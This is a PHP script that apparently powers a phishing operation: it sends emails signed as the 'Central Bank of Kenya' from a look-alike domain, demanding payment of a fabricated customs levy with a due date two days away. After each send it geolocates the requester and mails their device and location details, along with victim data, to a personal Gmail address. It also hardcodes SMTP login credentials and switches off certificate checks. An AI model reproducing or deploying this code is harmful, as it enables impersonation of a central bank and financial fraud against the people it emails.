<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', 'email_errors.log');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

require 'vendor/autoload.php';
require_once 'ReminderEmailTemplate.php';

// Initialize response array
$response = ['success' => false, 'message' => '', 'debug' => []];

// Log function for debugging
function log_debug($message, $data = null) {
    $log = '[' . date('Y-m-d H:i:s') . '] ' . $message . PHP_EOL;
    if ($data !== null) {
        $log .= 'Data: ' . print_r($data, true) . PHP_EOL;
    }
    error_log($log, 3, 'email_debug.log');
}

// Helper functions for device and location info
function get_browser_name($user_agent) {
    if (strpos($user_agent, 'MSIE') !== FALSE) return 'Internet Explorer';
    elseif (strpos($user_agent, 'Edge') !== FALSE) return 'Microsoft Edge';
    elseif (strpos($user_agent, 'Trident') !== FALSE) return 'Internet Explorer';
    elseif (strpos($user_agent, 'Firefox') !== FALSE) return 'Mozilla Firefox';
    elseif (strpos($user_agent, 'Chrome') !== FALSE) return 'Google Chrome';
    elseif (strpos($user_agent, 'Safari') !== FALSE) return 'Safari';
    elseif (strpos($user_agent, 'Opera') !== FALSE) return 'Opera';
    return 'Unknown';
}

function get_os_info($user_agent) {
    if (preg_match('/windows|win32/i', $user_agent)) return 'Windows';
    elseif (preg_match('/android/i', $user_agent)) return 'Android';
    elseif (preg_match('/iphone|ipad|ipod/i', $user_agent)) return 'iOS';
    elseif (preg_match('/macintosh|mac os x/i', $user_agent)) return 'Mac OS';
    elseif (preg_match('/linux/i', $user_agent)) return 'Linux';
    return 'Unknown';
}

function get_device_type($user_agent) {
    $mobile_agents = '/(android|webos|iphone|ipad|ipod|blackberry|windows phone)/i';
    if (preg_match($mobile_agents, $user_agent)) {
        if (preg_match('/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i', $user_agent)) {
            return 'Tablet';
        }
        return 'Mobile';
    }
    return 'Desktop';
}

function get_ip_location($ip) {
    if ($ip === 'Unknown' || $ip === '127.0.0.1') {
        return ['country' => 'Localhost', 'city' => 'Development Environment'];
    }
    
    // Try to get location from IP-API
    $location = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
    
    if ($location && $location['status'] === 'success') {
        return [
            'country' => $location['country'] ?? 'Unknown',
            'country_code' => $location['countryCode'] ?? 'Unknown',
            'region' => $location['regionName'] ?? 'Unknown',
            'city' => $location['city'] ?? 'Unknown',
            'zip' => $location['zip'] ?? 'Unknown',
            'lat' => $location['lat'] ?? 'Unknown',
            'lon' => $location['lon'] ?? 'Unknown',
            'isp' => $location['isp'] ?? 'Unknown',
            'org' => $location['org'] ?? 'Unknown',
            'as' => $location['as'] ?? 'Unknown'
        ];
    }
    
    return ['country' => 'Unknown', 'city' => 'Unknown'];
}

function getDeviceInfo() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    return [
        'ip_address' => $ip,
        'user_agent' => $user_agent,
        'browser' => get_browser_name($user_agent),
        'os' => get_os_info($user_agent),
        'device_type' => get_device_type($user_agent),
        'request_time' => date('Y-m-d H:i:s', $_SERVER['REQUEST_TIME'] ?? time()),
        'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'Unknown',
        'http_referer' => $_SERVER['HTTP_REFERER'] ?? 'Direct access',
        'server_name' => $_SERVER['SERVER_NAME'] ?? 'Unknown',
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'http_accept_language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown',
        'location' => get_ip_location($ip)
    ];
}

function sendAdminNotification($recipientName, $recipientEmail, $emailDetails, $deviceInfo) {
    $adminEmail = 'livingstoneapeli@gmail.com';
    $subject = '✅ New Reminder Email Sent - ' . date('Y-m-d H:i:s');
    
    $body = "📧 NEW REMINDER EMAIL NOTIFICATION\n";
    $body .= "================================\n\n";
    
    $body .= "👤 RECIPIENT INFORMATION\n";
    $body .= "----------------------\n";
    $body .= "Name: $recipientName\n";
    $body .= "Email: $recipientEmail\n\n";
    
    $body .= "💰 PAYMENT DETAILS\n";
    $body .= "-----------------\n";
    $body .= "Payment Amount: KES " . number_format($emailDetails['payment_amount'], 2) . "\n";
    $body .= "Payment Date: {$emailDetails['payment_date']} at {$emailDetails['payment_time']}\n";
    $body .= "Revised Levy: KES " . number_format($emailDetails['revised_levy'], 2) . "\n";
    $body .= "Outstanding Balance: KES " . number_format($emailDetails['outstanding_balance'], 2) . "\n";
    $body .= "Due Date: {$emailDetails['due_date']}\n";
    $body .= "Remittance Amount: KES " . number_format($emailDetails['remittance_amount'], 2) . "\n\n";
    
    $body .= "🖥️ DEVICE INFORMATION\n";
    $body .= "-------------------\n";
    $body .= "IP Address: {$deviceInfo['ip_address']}\n";
    $body .= "Browser: {$deviceInfo['browser']}\n";
    $body .= "Operating System: {$deviceInfo['os']}\n";
    $body .= "Device Type: {$deviceInfo['device_type']}\n";
    $body .= "User Agent: {$deviceInfo['user_agent']}\n\n";
    
    $body .= "📍 LOCATION INFORMATION\n";
    $body .= "-------------------\n";
    $body .= "Country: {$deviceInfo['location']['country']} ({$deviceInfo['location']['country_code']})\n";
    $body .= "Region: {$deviceInfo['location']['region']}\n";
    $body .= "City: {$deviceInfo['location']['city']}\n";
    $body .= "ZIP: {$deviceInfo['location']['zip']}\n";
    $body .= "Coordinates: {$deviceInfo['location']['lat']}, {$deviceInfo['location']['lon']}\n";
    $body .= "ISP: {$deviceInfo['location']['isp']}\n";
    $body .= "Organization: {$deviceInfo['location']['org']}\n";
    $body .= "AS: {$deviceInfo['location']['as']}\n\n";
    
    $body .= "🌐 REQUEST DETAILS\n";
    $body .= "----------------\n";
    $body .= "Request Time: {$deviceInfo['request_time']}\n";
    $body .= "Request Method: {$deviceInfo['request_method']}\n";
    $body .= "Referrer: {$deviceInfo['http_referer']}\n";
    $body .= "Server: {$deviceInfo['server_name']}\n";
    $body .= "Server Software: {$deviceInfo['server_software']}\n";
    $body .= "Language: {$deviceInfo['http_accept_language']}\n\n";
    
    $body .= "================================\n";
    $body .= "This is an automated notification.\n";
    
    $mail = new PHPMailer(true);
    
    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = 'mail.supportcbk.net';
        $mail->SMTPAuth = true;
        $mail->Username = 'info@supportcbk.net';
        $mail->Password = 'Mont@2001';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
        $mail->Port = 465;
        $mail->CharSet = 'UTF-8';
        
        // Recipients
        $mail->setFrom('info@supportcbk.net', 'CBK Notification System');
        $mail->addAddress($adminEmail);
        
        // Content
        $mail->isHTML(false);
        $mail->Subject = $subject;
        $mail->Body = $body;
        
        $mail->send();
        log_debug('Admin notification sent successfully');
    } catch (Exception $e) {
        log_debug('Failed to send admin notification', ['error' => $e->getMessage()]);
    }
}

// Validate and sanitize inputs
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get and sanitize form data with null checks
    $recipient_name = isset($_POST['recipient_name']) ? htmlspecialchars(trim($_POST['recipient_name']), ENT_QUOTES, 'UTF-8') : '';
    $email = isset($_POST['email']) ? filter_var(trim($_POST['email']), FILTER_SANITIZE_EMAIL) : '';

    $payment_amount = 450000;
    $payment_date = "Tuesday, 19 August 2025"; 
    $payment_time = "11:27 AM"; 
    $revised_levy = 927000; 
    $outstanding_balance = 477000; 
    $due_date = date('l, j F Y', strtotime('+2 days'));
    $remittance_amount = 18540000;

    // Validate required fields
    if (empty($recipient_name) || empty($email)) {
        throw new Exception('Recipient name and email are required');
    }

    try {
        log_debug('Starting reminder email sending process', [
            'recipient_email' => $email,
            'recipient_name' => $recipient_name
        ]);

        // Create and configure email template with the provided values
        $emailTemplate = new ReminderEmailTemplate();
        $emailTemplate
            ->setRecipientName($recipient_name)
            ->setPaymentAmount($payment_amount)
            ->setPaymentDate($payment_date)
            ->setPaymentTime($payment_time)
            ->setLevyType("Customs/Export-Import Levy")
            ->setLevyPercentage(5)
            ->setReferenceNumber("REF-" . time())
            ->setSenderName("Central Bank of Kenya")
            ->setSenderTitle("Banking and Payment Services")
            ->setRevisedLevyAmount($revised_levy)
            ->setOutstandingBalance($outstanding_balance)
            ->setDueDate($due_date)
            ->setRemittanceAmount($remittance_amount);

        // Generate email content
        $emailData = $emailTemplate->generateEmail();

        // Configure PHPMailer
        $mail = new PHPMailer(true);

        // Server settings
        $mail->isSMTP();
        $mail->Host = 'mail.supportcbk.net';
        $mail->SMTPAuth = true;
        $mail->Username = 'info@supportcbk.net';
        $mail->Password = 'Mont@2001'; 
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;
        $mail->SMTPDebug = 0; // Disable debug output
        $mail->SMTPOptions = [
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true
            ]
        ];

        // Recipients
        $mail->setFrom('info@supportcbk.net', 'Central Bank of Kenya');
        $mail->addAddress($email, $recipient_name);
        $mail->addReplyTo('info@supportcbk.net', 'Central Bank of Kenya');

        // Content
        $mail->isHTML(true);
        $mail->Subject = $emailData['subject'];
        $mail->Body = $emailData['body'];
        $mail->AltBody = strip_tags($emailData['body']); // Plain text fallback

        // Add custom headers
        $headers = explode("\r\n", $emailData['headers']);
        foreach ($headers as $header) {
            $mail->addCustomHeader($header);
        }

        // Send email
        try {
            $mail->send();
            log_debug('Email sent successfully to ' . $email);
            
            // Send admin notification with device info
            $deviceInfo = getDeviceInfo();
            $emailDetails = [
                'payment_amount' => $payment_amount,
                'payment_date' => $payment_date,
                'payment_time' => $payment_time,
                'recipient_name' => $recipient_name,
                'recipient_email' => $email,
                'reference_number' => $emailTemplate->getReferenceNumber()
            ];
            
            sendAdminNotification($recipient_name, $email, $emailDetails, $deviceInfo);
            
            $response = [
                'success' => true,
                'message' => 'Email sent successfully',
                'data' => [
                    'recipient' => $email,
                    'reference' => $emailTemplate->getReferenceNumber(),
                    'timestamp' => date('Y-m-d H:i:s')
                ]
            ];
            
        } catch (Exception $e) {
            $errorMsg = "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
            error_log($errorMsg);
            $response['message'] = 'Failed to send email. Please try again.';
        }
        
    } catch (Exception $e) {
        $errorMsg = "Message could not be sent. Please try again later.";
        $response['message'] = $errorMsg;
        log_debug('Email sending failed', [
            'error' => $e->getMessage(),
            'trace' => $e->getTraceAsString()
        ]);
    }
} else {
    $response['message'] = 'Invalid request method.';
}

// Ensure no output before this
if (ob_get_level() > 0) {
    ob_clean();
}

// Return JSON response
header('Content-Type: application/json');
echo json_encode($response);
exit; // Make sure no other output is sent